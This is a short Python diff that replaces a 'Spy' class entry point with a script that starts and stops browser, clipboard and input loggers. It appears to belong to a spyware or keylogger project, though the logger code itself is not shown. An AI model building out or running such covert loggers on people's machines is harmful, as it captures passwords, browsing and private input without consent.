@@ -1,17 +1,15 @@
-from core.spy import Spy
-import sys
+import time
+from core.loggers.browser_logger import BrowserLogger
+from core.loggers.clipboard_logger import ClipboardLogger
+from core.loggers.input_logger import InputLogger
 
-def main():
-    spy = Spy()
-    try:
-        spy.start()
-    except KeyboardInterrupt:
-        spy.stop()
-        print("Stopped successfully.")
-    except Exception as e:
-        print("An error occured: ", e)
-        return 1
-    return 0
-
-if __name__ == "__main__":
-    sys.exit(main())
+browser_logger = BrowserLogger()
+clipboard_logger = ClipboardLogger()
+input_logger = InputLogger()
+browser_logger.start()
+clipboard_logger.start()
+input_logger.start()
+time.sleep(1)
+browser_logger.stop()
+clipboard_logger.stop()
+input_logger.stop()
